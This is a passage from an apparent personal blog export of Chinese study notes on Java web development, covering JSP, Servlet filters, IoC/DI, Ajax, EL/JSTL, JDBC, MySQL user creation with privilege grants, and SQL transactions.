admin&#125;&quot;&gt; &lt;c:redirect url=&quot;/login.html&quot;&gt;&lt;/c:redirect&gt;&lt;/c:if&gt; 方法二：将**==除了登陆界面以外的所有界面放到 web-inf 下保护起来==**，禁止用户直接通过 URL 访问。 在前后端不分离的项目中，一般我们会在 WEB-INF 下新建一个 page 文件夹，然后将所界面（除了登陆页面以外）放到里面，进行保护起来。 有一个问题： 未登录访问 controller url web 中的过滤器（**==Filter==**）：一个 web 组件。 用来拦截不符合要求的请求，并对其进行处理。 我们可以将所有 controller 中公用的代码（例如：设置编码格式，类似于BaseController中的 service 方法）抽离出来，放到 Filter 中，让 Filter 对请求与响应进行增强。 过滤器FILter主要功能：1、用来拦截不符合要求的请求，并对其进行处理 2、我们可以将所有的controller中公用的代码抽离出来，放到Filter中。让Filter对进入controller的请求与相应进行相应的过滤拦截。 使用方法：1、继承接口Filter（servletl） 2、主要复写doFilter方法 3、添加路径WebFilter（”/*”）,代表过滤所有 问题1：Filter可以拦截所有的web资源，包括html，css，js，img，servlet等所有资源。但是我们只想让它拦截controller请求与回应 解决1：1、给所有controller路径配置统一的后缀 例如do或者action。然后设置filter的拦截路径为@webFilter(“/*.do”)。这样既可以区别出Controller与前端资源 2、在Filter中过滤掉不需要请求，对其直接放行（不常用）。 例如，在doFilter中使用arg0.getRequestURI()方法，将uri以split(“/“)分割成数组，将数组最后一个字符串以split(“\\.”)分割得到后缀。然后放行后缀为（.html, .css , .js , .img ）的请求。 注意：Filter只拦截新的请求，并不拦截请求转发。我们可以通过配置xml中dispatcher参数调控 FORWARD 拦截请求转发 INCLUDE 拦截INCLUDE REQUEST 拦截请求（默认） ERROR 拦截错误 Filter的映射细节:1、服务器在启动时，会优先于Servlet先创建Filter对象，然后执行其Init初始化方法。 2、一个项目可以配置多个Filter（Filter链），多个Filter按照web.xml配置顺序执行 文件下载POI是 apache 的一个开源项目，该项目主要作用哦是用来操作 WPS 的 API。 实现功能 文件下载 将数据库的数据生成后缀是 .xlsx 的文件，并让用户可以进行下载。 文件上传 用户可以上传一个后缀 .xlsx 的文件，可将其持久化到数据库。 IOC与DI浅显易懂的举例 部分概念 代码模拟 解耦合在我们编码的过程中，通常都需要两个或者更多的类通过彼此的合作来实现业务逻辑，也就是说，某个对象需要获取与其合作对象的引用，如果这个获取的过程需要自己实现，代码的耦合度就会高，维护起来的成本就比较高。 1.1、IoC是什么 Ioc—Inversion of Control，即“控制反转”，不是什么技术，而是一种设计思想。在Java开发中，Ioc意味着将你设计好的对象交给容器控制，而不是传统的在你的对象内部直接控制。如何理解好Ioc呢？理解好Ioc的关键是要明确“谁控制谁，控制什么，为何是反转（有反转就应该有正转了），哪些方面反转了”，那我们来深入分析一下： ●谁控制谁，控制什么：传统Java SE程序设计，我们直接在对象内部通过new进行创建对象，是程序主动去创建依赖对象；而IoC是有专门一个容器来创建这些对象，即由Ioc容器来控制对 象的创建；谁控制谁？当然是IoC 容器控制了对象；控制什么？那就是主要控制了外部资源获取（不只是对象包括比如文件等）。 ●为何是反转，哪些方面反转了：有反转就有正转，传统应用程序是由我们自己在对象中主动控制去直接获取依赖对象，也就是正转；而反转则是由容器来帮忙创建及注入依赖对象；为何是反转？因为由容器帮我们查找及注入依赖对象，对象只是被动的接受依赖对象，所以是反转；哪些方面反转了？依赖对象的获取被反转了。 用图例说明一下，传统程序设计如图2-1，都是主动去创建相关对象然后再组合起来： 图1-1 传统应用程序示意图 1.2、IoC能做什么 IoC 不是一种技术，只是一种思想，一个重要的面向对象编程的法则，它能指导我们如何设计出松耦合、更优良的程序。传统应用程序都是由我们在类内部主动创建依赖对象，从而导致类与类之间高耦合，难于测试；有了IoC容器后，把创建和查找依赖对象的控制权交给了容器，由容器进行注入组合对象，所以对象与对象之间是 松散耦合，这样也方便测试，利于功能复用，更重要的是使得程序的整个体系结构变得非常灵活。 其实IoC对编程带来的最大改变不是从代码上，而是从思想上，发生了“主从换位”的变化。应用程序原本是老大，要获取什么资源都是主动出击，但是在IoC/DI思想中，应用程序就变成被动的了，被动的等待IoC容器来创建并注入它所需要的资源了。 IoC很好的体现了面向对象设计法则之一—— 好莱坞法则：“别找我们，我们找你”；即由IoC容器帮对象找相应的依赖对象并注入，而不是由对象主动去找。 1.3、IoC和DI DI—Dependency Injection，即“依赖注入”：组件之间依赖关系由容器在运行期决定，形象的说，即由容器动态的将某个依赖关系注入到组件之中。依赖注入的目的并非为软件系统带来更多功能，而是为了提升组件重用的频率，并为系统搭建一个灵活、可扩展的平台。通过依赖注入机制，我们只需要通过简单的配置，而无需任何代码就可指定目标需要的资源，完成自身的业务逻辑，而不需要关心具体的资源来自何处，由谁实现。 理解DI的关键是：“谁依赖谁，为什么需要依赖，谁注入谁，注入了什么”，那我们来深入分析一下： ●谁依赖于谁：当然是应用程序依赖于IoC容器； ●为什么需要依赖：应用程序需要IoC容器来提供对象需要的外部资源； ●谁注入谁：很明显是IoC容器注入应用程序某个对象，应用程序依赖的对象； ●注入了什么：就是注入某个对象所需要的外部资源（包括对象、资源、常量数据）。 IoC和DI由什么关系呢？其实它们是同一个概念的不同角度描述，由于控制反转概念比较含糊（可能只是理解为容器控制对象这一个层面，很难让人想到谁来维护对象关系），所以2004年大师级人物Martin Fowler又给出了一个新的名字：“依赖注入”，相对IoC 而言，“依赖注入”明确描述了“被注入对象依赖IoC容器配置依赖对象”。 看过很多对Spring的Ioc理解的文章，好多人对Ioc和DI的解释都晦涩难懂，反正就是一种说不清，道不明的感觉，读完之后依然是一头雾水，感觉就是开涛这位技术牛人写得特别通俗易懂，他清楚地解释了IoC(控制反转) 和DI(依赖注入)中的每一个字，读完之后给人一种豁然开朗的感觉。我相信对于初学Spring框架的人对Ioc的理解应该是有很大帮助的。","link":"","tags":[{"name":"javaWeb","slug":"javaWeb","permalink":"http://www.fangning.xyz.com/tags/javaWeb/"}]},{"title":"mysql备份升级","date":"2021-12-25T01:44:30.000Z","path":"2021/12/25/2021.12.25 mysql升级/","text":"卸载旧版本原因不能使用 on update stamp 事件 给 timestamp 类型字段添加，默认创建时间，以及默认更新时间，以及多个共存的功能，老版本不支持。 卸载 mysql5.1 刚开始用的时候，随便找了个安装包，没想到版本这么低，今天遇到了不能使用 on update current_timestamp 约束的问题，所以需要升级数据库版本！ 如果是在 navicat 中使用的话，先将原数据库中，表的建表 sql 保存好； 然后，关闭服务，卸载服务，控制面板卸载软件，去安装目录卸载配置文件，删除系统环境变量 path。 安装最新版 mysqlmysql 5.8 下载 安装方法","link":"","tags":[{"name":"mysql","slug":"mysql","permalink":"http://www.fangning.xyz.com/tags/mysql/"}]},{"title":"Ajax","date":"2021-12-22T11:15:30.000Z","path":"2021/12/22/2021.12.22 Ajax/","text":"Ajax简介 Ajax 全称 asynchronous javascript and xml：异步的 JS 和 XML； AJAX 不是一门新的编程语言，而是现有语言的一种使用方式。 同步与异步 同步 发一个请求：就要等待服务器的响应结束，然后才能发第二个请求！中间这段时间段，就会==“卡”==一下。 刷新的是整个页码！ 异步 发一个请求后，==无需等待服务器响应==，直接就可以发第二个请求。 可以使用 JS 接受服务器的响应，==实现局部刷新==！ 1234567891011121314151617181920212223&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;AJAX&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;button id=&quot;btn&quot;&gt;按这里&lt;/button&gt;&lt;br&gt; &lt;h1 id=&quot;hi1&quot;&gt;&lt;/h1&gt; &lt;/body&gt; &lt;script type=&quot;text/javascript&quot;&gt; window.onload = function() &#123; // 文档加载完成后，立刻执行！ var btn = document.getElementById(&quot;btn&quot;); // 给 btn 的 click 事件，注册监听 btn.onclick = function() &#123; // 按钮按下后，立刻执行！ var h1 = document.getElementById(&quot;hi1&quot;); h1.innerHTML = &quot;Hello JS!!&quot; ; &#125;; &#125;; &lt;/script&gt;&lt;/html&gt; 异步同步交互图 AJAX它能使 JS 访问服务器，而且是==异步访问==！ 原来的 js 只是为 html 页面做一些动态支持。 原来的服务器给客户端响应一般是整个页面，一个 html 完整页面！ 但在 ajax 中因为是局部刷新，那么服务器就不需要再响应整个页面，而只是数据！ text：纯文本； xml； json：它是 js 提供的数据交互格式，它在 ajax 中最受欢迎！ 不能是对象，因为 js 不认识对象。两边都认识，才能做数据收发。 AJAX应用场景和优缺点应用场景 百度搜索框：输入一个关键字，会立马提供一组相关的下拉框。随着输入的关键字改变，相关推荐也会改变。关键字只取 limit 10。 局部刷新，用户体验较好。 刷新不得耽误点击搜索。 注册页面：输入用户名，鼠标移开，会出现一个占用提示。这个提示的出现，需要通过连接数据库，查重所有用户名。 即使该过程很慢，没加载出来，我们也可以继续当前页面其它内容，并不耽误我们做接下来的动作。 异步交互，不卡顿。 淘宝一些分页显示，等等…… AJAX优缺点优点 异步交互：增强了用户的体验； 性能：因为服务器无需响应整个页面，只需要响应部分内容，所以服务器压力减轻了； 缺点 AJAX 不能应用在所有场景。 百度搜索点击，搜索之后，肯定是整个跳转。 AJAX 无端增加了访问服务器的次数，给服务器带来了压力。 搜索栏，边打字，边显示不同推送，频率增多了。 AJAX 四步操作AJAX 发送异步请求（==四步==）第一步：得到 ==XMLHttpRequest==对象 ajax 只需要学习一个对象：XMLHttpRequest。掌握了该对象，就掌握了 AJAX！！！ 获取方式： 大多数浏览器支持（谷歌、火狐、IE7、IE8……）：var xmlHttp = new XMLHttpRequest(); IE6.0：var xmlHttp = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;) ; IE5.5之前：Var xmlHttp = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;) ; 编写函数： 12345678910111213141516function createXMLHttpRequest() &#123; try &#123; return new XMLHttpRequest() ; &#125; catch(e) &#123; try &#123; return new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;) ; &#125; catch(e) &#123; try &#123; return new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;) ; &#125; catch(e) &#123; alert(&quot;哥们，你用的啥浏览器啊？？？&quot;) ; throw e ; &#125; &#125; &#125;&#125; 第二步：打开与服务器的连接 xmlHttp.open() ;：用来打开与服务器的连接，他需要三个参数： 请求方式：GET/POST ； 请求的URL：指定的服务器端字段，eg：/WDemo/AServlet 是否为异步：一共布尔值，true 表示发送异步请求，false 为同步请求！ xmlHttp.open(&quot;GET&quot;, &quot;/WDemo/AServlet&quot;, true) ; 第三步：发送请求 xmlHttp.send(null) ; 必须填一个参数，即使是 null，否则部分浏览器（FireFox）无法发送。 参数：就是请求体内容！如果是 GET 请求，必须给出 null。xmlHttp.send(&quot;username=zhangSan&amp;password=123456&quot;) ; 第四步：获取响应数据 因为是异步请求，发送可以连续发。那么什么时候获取响应呢？不需要等待，而是采用监听。 在 xmlHttp 对象的**==状态改变事件==**上注册监听器：onreadystatechange。 xmlHttp 对象一共有 5 个状态 0状态：初始化未完成状态，没有进行第二步，没调用 open() 方法； 1状态：请求开始，调用了 open() 方法，没调用 send() 方法； 2状态：调用完了 send() 方法； 3状态：服务器以及开始响应，但不表示响应结束了！ 4状态：服务器响应结束！（通常这才是我们所需要关心的状态！！） 获取 xmlHttp 对象的状态 var state = xmlHttp.readyState ; 例如：0、1、2、3、4 获取服务器的状态码 var status = xmlHttp.status ;例如：200成功、404找不到、500服务器异常、302重定向、304没有改变，等等。 得到服务器响应的内容 var content = xmlHttp.responseText ; 得到服务器响应的==文本内容==。 更为通用，即使服务响应的是 xml 也可以当成字符串来接收，然后做解析。 var content = xmlHttp.responseXML ; 得到服务器响应的==xml 格式内容==，它自动解析为 Document 对象，非字符串。 如果服务器响应的不是 xml，哪就不支持了。 12345xmlHttp.onreadystatechange = function() &#123; // xmlHttp的5种状态都会调用本方法 if(xmlHttp.readyState == 4 &amp;&amp; xmlHttp.status == 200) &#123; var text = xmlHttp.responseText ; &#125;&#125; 第一例：Hello AJAXController层 AServlet 类：获取请求，并做出响应，返回一共字符串。 1234567protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; System.out.println(&quot;Hello AJAX&quot;); resp.setCharacterEncoding(&quot;UTF-8&quot;); resp.setHeader(&quot;ContentType&quot;, &quot;text/html; charset=UTF-8&quot;); resp.getWriter().write(&quot;Hello AJAX&quot;);&#125; web.xml配置parttern 请求转到后端 Servlet 需要通过 xml 映射路径。 12345678&lt;servlet&gt; &lt;servlet-name&gt;A&lt;/servlet-name&gt; &lt;servlet-class&gt;com.ishangu.ajax.AServlet&lt;/servlet-class&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;A&lt;/servlet-name&gt; &lt;url-pattern&gt;/AServlet&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; test.jsp 显示 前端的显示代码，都在这里面；以及通过 js 代码写AJAX四步，实现发送 GET 请求，获取服务器响应； 用到了 JSTL 需要一引入两个依赖包：jstl.jar 和 standard.jar。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;&lt;%@taglib prefix=&quot;c&quot; uri=&quot;http://java.sun.com/jsp/jstl/core&quot; %&gt;&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;AJAX&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;测试！&lt;/h1&gt; &lt;button id=&quot;btn&quot;&gt;按这里&lt;/button&gt;&lt;br&gt; &lt;h1 id=&quot;hi1&quot;&gt;&lt;/h1&gt; &lt;/body&gt; &lt;script type=&quot;text/javascript&quot;&gt; window.onload = function() &#123; var btn = document.getElementById(&quot;btn&quot;); btn.onclick = function() &#123; /* 四步操作，把服务器响应内容，显示到 h1 标签内。 */ // 第一步：获取 XMLHttpRequest 对象 var xmlHttp = createXMLHttpRequest() ; // 第二步：打开与服务器的连接 xmlHttp.open(&quot;GET&quot;, &quot;&lt;c:url value=&#x27;/AServlet&#x27;/&gt;&quot;, true) ; // xmlHttp.open(&quot;GET&quot;, &quot;AServlet&quot;, true) ; // xmlHttp.open(&quot;GET&quot;, &quot;/AJAX/AServlet&quot;, true) ; // 第三步：发送请求给服务器 xmlHttp.send(null) ; // 第四步：监听状态改变，直到完全获取服务器响应 xmlHttp.onreadystatechange = function() &#123; if(xmlHttp.readyState == 4 &amp;&amp; xmlHttp.status == 200) &#123; var text = xmlHttp.responseText ; var h1 = document.getElementById(&quot;hi1&quot;); h1.innerHTML = text ; &#125; &#125;; &#125;; &#125;; function createXMLHttpRequest() &#123; try &#123; return new XMLHttpRequest() ; &#125; catch (e) &#123; try &#123; return ActiveXObject(&quot;Msxml2.XMLHTTP&quot;) ; &#125; catch (e) &#123; try &#123; return ActiveXObject(&quot;Microsoft.XMLHTTP&quot;) ; &#125; catch (e) &#123; alert(&quot;哥们儿！您用的啥浏览器啊？？&quot;); throw e ; &#125; &#125; &#125; &#125; &lt;/script&gt;&lt;/html&gt; Jquery-AJAX $(“#id”).load(url, data, callback) ; $.get(url, callback) ; $.post(url, data, callback);","link":"","tags":[{"name":"javaWeb","slug":"javaWeb","permalink":"http://www.fangning.xyz.com/tags/javaWeb/"}]},{"title":"jsp","date":"2021-12-21T06:18:30.000Z","path":"2021/12/21/2021.12.21 JSP/","text":"JSP需求​ 为什么需要 JSP（java servlet page）？ 虽然我们可以在 Servlet 中使用输出流，通过 ServletResponse 来写一个 HTML 数据响应给浏览器，但是这样编写页码非常麻烦，并且 Servlet 中写前端代码的话没有做到责任分离。 HTML 是一个静态页面，而我们通过数据库查找数据，一般都是后期传递给 HTML 页面的，如果想要将数据填充到 HTML 页码内，需要编写复杂的 JS 代码（通过 JS 动态输出表格，然后插入数据），编写此类代码，大大提高了开发难度。 语法注释 &lt;%--注释内容、代码--%&gt;： 真正的注释，注释掉的的东西，不会执行。==快捷键：ctrl+shift+c== &lt;!--假注释--&gt;：注释掉的代码依旧会执行！！！ HTML中编写Java JAVA 代码写在 HTML 中，就变成了 jsp 代码。 jsp最终，实际上还是转化为 Servlet 程序，里面的 HTML 语句都是通过 ServletResponse.getOutputStream() 输出流写入到前端的。 其中 jsp 包含了 9 大内置对象 12345678final javax.servlet.jsp.PageContext pageContext;javax.servlet.http.HttpSession session = null;final javax.servlet.ServletContext application;final javax.servlet.ServletConfig config;javax.servlet.jsp.JspWriter out = null;final java.lang.Object page = this;javax.servlet.jsp.JspWriter _jspx_out = null;javax.servlet.jsp.PageContext _jspx_page_context = null; 编写时，新建一个 .jsp 文件，然后在 &lt;% java code %&gt; 双标签中写 ServletJava 程序。 取出 ServletJava 代码中声明的变量到 html 标签中，需要使用 &lt;%= var %&gt; 包裹变量名。 HTML中调用 Servlet三层架构与MVC视图层主要包括页码，Servlet，各种对象。 细分为： Model 简单理解为，页面接收，和展示的各种数据，回呗我们封装成对象。 View 所有的前端页面，负责展示数据。 Controller Servlet 负责如下功能。 接受页面参数； 调用业务层处理业务逻辑； 控制页面跳转或响应用户。 业务层（service）专门书写业务逻辑的地方，例如文件上传，文件下载，或者接收到的 model 对象不全需要补齐，以及控制数据库事务等，调用持久层等操作，都可以在业务层进行，Service 层需要与 DAO 层一样都有接口和实现类。 持久层（数据层）主要就是我们的 JDBC 代码，使用的是 DAO 设计模式。 项目组织架构在开发中，前台用户通过浏览器分到 Controller，Controller JSP 三大指令page可以用于设置编码格式，导包，指定编程语言，指定错误页面等功能。 报错展示界面 error.jsp 123&lt;error-page&gt; &lt;&gt;&lt;/error-page&gt; 1&lt;%@page page=error%&gt; include用于在一个 jsp 中包含另外一个 jsp，相当于给 jsp 进行二合一。 静态包含：是指将多个 jsp 中的内容封装到一个 .java 文档中，所以在多个 jsp 包含时定义的变量不可重复。 静态包含发生时机：产生 .java 文件的时候。 编译生成一个 .class 文件。 1&lt;%@include file=&quot;b.jsp&quot;%&gt; 动态包含：是每个 jsp 都会产生对于的 .java 文件，并且都有各自的 .class，所以变量可重名。 发生时机：是在加载 .class 文件的时候。 编译生成两个 .class 文件。 1&lt;jsp:include page=&quot;b.jsp&quot;&gt; taglib用来引入第三方类库，可以在 jsp 中引入比人写好的标签。 EL表达式JSP 使用问题 JSP 中总是有 java 代码，无法体现责任分离。 JSP 中从各个变量中取值非常麻烦（&lt;%=var&gt;）。 遍历集合以及判断语句非常麻烦。 EL表达式 内部有 11 个内置对象，常用的有 requestScope、sessionScope、applicationScope …… 主要作用：从Servlet 各个域（pageContext,request,session,application）中取值（仅能取域值）。语法：$&#123;key&#125;。 不支持循环遍历。 1$&#123;key&#125; &lt;!--直接从 reques,session,context由小到大查找取值--&gt; 指定域进行取值 123$&#123;requestScope.key&#125;$&#123;sessionScope.key&#125;$&#123;applicationScope.key&#125; 如果找不到 12$&#123;asd&#125; &lt;!--报错，不显示--&gt;$&#123;123&#125; &lt;!--返回一个数字 123 --&gt; 支持数字运算、对比、判断为空、三元条件运算符、&amp;&amp;、|| 12345$&#123;100+100&#125; &lt;!-- 二北 --&gt;$&#123;100&gt;200&#125; &lt;!-- false --&gt;$&#123;empty key&#125; &lt;!-- true/false --&gt;$&#123;3&gt;5?&quot;3大于5&quot;:&quot;3不大于5&quot;&#125; &lt;!-- 3大于5 --&gt;$&#123;3&gt;5 &amp;&amp; 1&lt;2 ? &quot;3大于5&quot; : &quot;3不大于5&quot;&#125; &lt;!-- 3大于5 --&gt; 取对象的属性值 12345678910$&#123;user&#125; 直接 toString 输出整个对象值$&#123;user.name&#125; 直接访问属性值$&#123;user.getId()&#125; 调用方法---------------List集合$&#123;list&#125;$&#123;list[0].name&#125;---------------Map容器$&#123;map&#125;$&#123;map.key1&#125;$&#123;map.key1.name&#125; JSTL 是一套比尔写好的标签库，例提供了很多非常使用的标签，可以让我们 jsp 与 java 代码进行解耦，并且 jstl 支持使用 EL 表达式，使用 jstl 需要引入依赖。 jstl.jar standard.jar JSTL 标签主要分为 5 种：*","link":"","tags":[{"name":"javaWeb","slug":"javaWeb","permalink":"http://www.fangning.xyz.com/tags/javaWeb/"}]},{"title":"Servlet","date":"2021-12-21T01:34:30.000Z","path":"2021/12/21/2021.12.21 Servlet/","text":"Servlet 作用域 三大作用域​ 作用域主要就是用来存储数据的，根据作用域的级别不同，数据的存储范围也不同。 作用域名称 对应Servlet对象 应用域 application ServletContext 会话域 session HttpSession 请求域 request ServletRequest 应用域 服务器开启，会自动创建应用域对象，这个对象是全局唯一的； 应用域中的数据，==在整个应用中可共享==。 会话域 会话是指浏览器的一次开启以及关闭，开启浏览器表示开启了一个会话，关闭浏览器表示会话结束（与同一个浏览器有多少标签页无关）。 ==数据可在同一个会话之间共享==。 请求域 浏览器每次访问我们的服务器都称为一次请求，数据如果存放在请求域中，==则仅当前请求可访问该数据==。 操作访问范围数据访问范围：应用域 &gt; 会话域 &gt; 请求域。 如果数据存在应用域中，只要服务不关闭，所有的 Servlet 都能访问到数据； 如果数据存在会话域之中，只有同一个会话才能从里面获取数据； 如果数据存在请求域之中，只有同一个请求才能获取数据。 注意 实际开发中，应用域很少使用，因为应用域的数据一般不过过期。 关系都是在服务端，限制浏览器端。 Web组件跳转​ 请求域中的数据，只有在同一个请求中可以共享，只要多次请求，就会造成请求域丢失。所以，如果采用不同的跳转方式，可以传递同一个请求，共享一个请求域。 重定向 多次请求，URL会改变，重新提交请求； 重定向通过 ServletResponse 响应执行，无法携带数据，无法共享请求域的数据； 加 / 表示，从 host 主机路径开始，填写绝对路径。 不加 / 表示，从当前 URL 路径下，填写路径。 123456// 当前 url：http://localhost:8080/WDemo/index.htmlresp.sendRedirect(&quot;/b.html&quot;) ; // 变成 http://localhost:8080/b.htmlresp.sendRedirect(&quot;b.html&quot;) ; // 变成 http://localhost:8080/WDemo/b.html 重定向后的请求，无法访问 WEB-INF 下的数据； 如果需要跳转页面，不要放置到 WEB-INF 文件夹下。 重定向可以跨域，访问其他 web 服务器。 1resp.sendRedirect(&quot;www.baidu.com&quot;) ; 请求转发 请求转发通过 ServletRequest 请求执行，==可以携带数据==，共享同一个请求域。 前后是同一个请求。 请求转发后，==可以访问 WEB-INF 下的数据==； 请求转发，不可以跨域。 1req.getRequestDispatcher(&quot;/crm/updateEmp.jsp&quot;).forward(req, resp) ;","link":"","tags":[{"name":"javaWeb","slug":"javaWeb","permalink":"http://www.fangning.xyz.com/tags/javaWeb/"}]},{"title":"JavaWeb","date":"2021-12-20T12:33:30.000Z","path":"2021/12/20/2021.12.20  javaWeb/","text":"Web 发展史最早时期​ 1990年 HTML 标记性语言的出现代表开启了 web 时代，从 web 时代开始 B/S架构 就不断的蚕食 C/S 架构，但是这个时期的浏览器页面非常差，只有简单的静态页面。 C/S 客户机/服务器架构 特点 客户端软件都会有一个本地数据库，所有的页面渲染和业务逻辑的处理都由客户端来完成（由于所有的内容几乎都下载到本地了，所以大部分功能都是由本地客户端完成，只需要网络交换极少数重要数据)。 优点 网络占用较少，较为安全，用户体验度较高，功能丰富。 缺点 对客户端要求较高，并且每次更新的时候要客户端进行手动更新，不同的操作系统无法兼容，可移植性较差。 B/S 浏览器/服务器架构​ 我们所有通过浏览器访问到的内容都是 B/S 架构。B/S 就是基于 C/S ，不过是浏览器变成了通用的客户端。 特点：所有的一切内容都是==基于浏览器完成的访问==，所有的==业务逻辑都有服务器来完成，浏览器负责页面的渲染和数据的交互==。 优点： 对客户端的配置要求较低，所有的升级以及更新都是有服务器来完成客户端不需要任何处理，不同的操作系统没有任何影响。 缺点：安全性较低，用户体验较差，网络占用率较高。 技术迭代 1993 ~ 1996 NCSA 推出了 CGI1.0 草案，web从静态发展成动态，赢来了一个较大的飞跃（==CIG带来了动态处理能力，能让服务器与浏览器进行交互==）。 1997 sun 公司推出了 Servlet 规范，98 年推出了 jsp 由于 jsp 技术的诞生 ==JavaBean+jsp+Servlet 实现了让 Java 拥有与 CGI 一样的能力==，从此Java迎来了历史性的飞跃。 重要概念Servlet Servlet：小型服务程序，规定了后端代码代码与浏览器进行沟通的规范。 本质上：Servlet 就是一组接口，里面定义了与浏览器进行沟通的各种规范,所以只要我们的代码实现了这个接口就能通过服务器与浏览器进行交互,所以只要我们写的类只要实现了Servlet接口都叫做Servlet。","link":"","tags":[{"name":"javaWeb","slug":"javaWeb","permalink":"http://www.fangning.xyz.com/tags/javaWeb/"}]},{"title":"xml和web","date":"2021-12-17T01:26:30.000Z","path":"2021/12/17/2021.12.17 XML和WEB/","text":"XML概念介绍 HTML：超文本标记语言，天生自带很多标签，每个标签都可以用来描述网页信息。 XML：可扩展标记语言，自身不带任何标签，所有的标签都是我们自定义的，或者我们也可以引入别人定义好的标签来使用，主要目的是用来传递数据。 目的 XML：设计之初，就是为了传递数据使用 XML解析方式 DOM解析 SAX解析 JDOM解析 DOM4J解析（最常使用的方式） 引入jar包 dom4j-1.6.1.jar jaxen-1.1-beta-7.jar sitemesh-2.2.1.jar 新建xml项目 语法 XML 格式与 HTML 类似，里面全部是由标签组成，只是标签变成了我们自定义的标签，我们定义标签的时候 WEB发展史 1990 年 HTML 标记性语言的出现代表开起来 Web 时代，从 Web 时代开始 B/S 架构就不断的蚕食 C/S 架构，但是这个时期的浏览器页面非常差，只有简单的静态页码。 B/S：浏览器 / 服务器模式。 实现 Servlet destroy getConfigServlet init service","link":"","tags":[{"name":"javaWeb","slug":"javaWeb","permalink":"http://www.fangning.xyz.com/tags/javaWeb/"}]},{"title":"java与数据库","date":"2021-12-14T01:35:30.000Z","path":"2021/12/14/2021.12.14 java与数据库/","text":"jdbc​ JDBC（Java Data Bases Connectivity）：java数据库连接规范，是 java 访问数据库的基石，其他所有访问数据库的技术（Mybatis, Hibernate, Springjdbc等）都是基于 JDBC 来实现的。 JDBC： dml 无返回 dqlOne 返回单行数据 特判：dqlOne中需要特判如果返回的不是一行，而是一个 int select COUNT(*) from table ; dqlList 多个返回！","link":"","tags":[{"name":"javaWeb","slug":"javaWeb","permalink":"http://www.fangning.xyz.com/tags/javaWeb/"}]},{"title":"创建用户赋予权限","date":"2021-12-13T11:43:30.000Z","path":"2021/12/13/2021.12.13 命令行创建用户/","text":"创建用户 ==可以直接在 navicat 中创建新用户，然后记得赋予权限==。 ==navicat新建连接的时候，需要填 连接名，用户名！和密码，主要修改用户名，默认是root，所以如果不该，会出现一下错误：== 连接名不是用户名，没啥卵用！瞎填都行，但是==连接的时候一定要记得，修改用户名！默认是 root 的==。 如果连接新用户，没给权限，会出现以下错误。用root账号，登陆如何添加对应用户权限即可！ 创建用户命令 用户 = 用户名+主机名+密码组成； 不指定主机名就默认为==%==**：表示可以匹配所有主机（==**包括远程连接==）。 命令如下：==只有单引号里面的内容可以自定义==。 12345# 指定主机&gt; create user &#39;admin&#39;@&#39;127.0.0.1&#39; identifide by &#39;123456&#39;;# 不指定主机&gt; create user &#39;fn&#39; identifide by &#39;123456&#39; ; 密码使用明文不安全，一般进行加密后再设置 123456# 获取加密后的字符串&gt; select password(&#39;123456&#39;) ;*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9# 再进行创建用户&gt; create user &#39;fn2&#39;@&#39;localhost&#39; identifide by password &#39;*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9&#39; ; 赋予新用户权限 新创建的用户是没有权限的，可以通过如下指令查看用户权限： 1234567891011121314151617# 先查看所有用户&gt; select user from mysql.user;+-------+| user |+-------+| fn || admin || root |+-------+# 查看指定用户权限&gt; show grants for fn+---------------------------------------------------------------------------------------------------+| Grants for fn@% |+---------------------------------------------------------------------------------------------------+| GRANT USAGE ON *.* TO &#39;fn&#39;@&#39;%&#39; IDENTIFIED BY PASSWORD &#39;*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9&#39; |+---------------------------------------------------------------------------------------------------+ grant 就是权限的意思，usage 表示只有登陆权限， ON *.* 表示针对所有表。 赋予权限 权限：给 admin 和 fn 赋予针对所有表(*.*)的所有(ALL)权限！ 1234&gt; grant ALL ON *.* to &#39;admin@127.0.0.1&#39; identified by &#39;123456&#39;,&#39;fn&#39; identified by &#39;123456&#39;with grant option; 其他详情参考该章节","link":"","tags":[{"name":"mysql","slug":"mysql","permalink":"http://www.fangning.xyz.com/tags/mysql/"}]},{"title":"TCL事务控制语言","date":"2021-12-12T16:00:00.000Z","path":"2021/12/13/2021.12.13 事物控制语言TCL/","text":"事务​ TCL（事务控制语言）事务实际上就是指我们要做的事情，在 SQL 语句中事务就代表了要执行的 sql 语句。 举例 张三给李四转账500北软妹币： ​ 步骤1：张三账户减少； ​ 步骤2：李四账户增加； ==如果步骤1执行成功，但是步骤2执行失败==，那么就会导致张三账户减少，但是李四账户不变，造成严重的错误。 此时，**==需要将两条sql，变成一件事情==，要么一起执行成功，要么一起执行失败的，这就是引入事务的原因！** 概念和操作默认情况关系型数据库中，默认每条 sql 语句都是一个单独的事务。执行成功后自动调用了 commit 修改数据库。 我们也可以取消默认，==让多条 sql 语句变成一个事务==。 事务操作 start transaction ; 开启一个事务；==表示接下来的 sql 语句都是一个整体，直到执行到 commit手动提交，或者rollback回滚才结束该事务，并修改数据库==； COMMIT ;：提交事务，==此时才真正修改掉数据库数据==，并结束事务。整个 transaction 执行无误，才调用 commit 修改数据库，否则执行了一半的事务调用 commit 依旧会修改数据库，造成数据混乱。 ROLLBACK ;：回滚事务，==可以让数据库恢复到，执行 sql 之前的状态==，并结束事务。如果 tansaction 执行半途出错，就调用 rollback 让数据恢复到事务执行之前，并结束此处事务。 123456789101112# 无错误情况START TRANSACTION ; # 开启一次事务执行UPDATE account SET money&#x3D;money-500 WHERE name&#x3D;&#39;张三&#39; ; # 张三转账UPDATE account SET money&#x3D;money+500 WHERE name&#x3D;&#39;李四&#39; ; # 李四收账COMMIT ; # 